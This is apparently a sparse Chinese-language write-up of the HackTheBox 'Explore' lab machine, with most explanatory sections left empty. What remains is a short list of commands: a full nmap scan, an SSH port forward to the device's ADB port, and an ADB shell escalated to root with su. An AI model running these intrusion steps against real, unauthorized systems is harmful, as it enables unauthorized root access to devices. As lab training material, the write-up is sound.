# 原创
：  HackTheBox - Explore

# HackTheBox - Explore

#### HackTheBox - Explore

## 连接配置

> 



## 渗透测试

### 信息搜集

> 



```
sudo nmap -A -sS -sC -sV -p- 10.10.10.247

```

### 漏洞挖掘

> 



### getshell

> 



> 



### 提权

> 



```
ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222 -N -v -v

```

> 



```
adb connect 127.0.0.1:5555

```

> 



```
adb -s 127.0.0.1:5555 shell
su

```

> 



```
find / -name root.txt

```
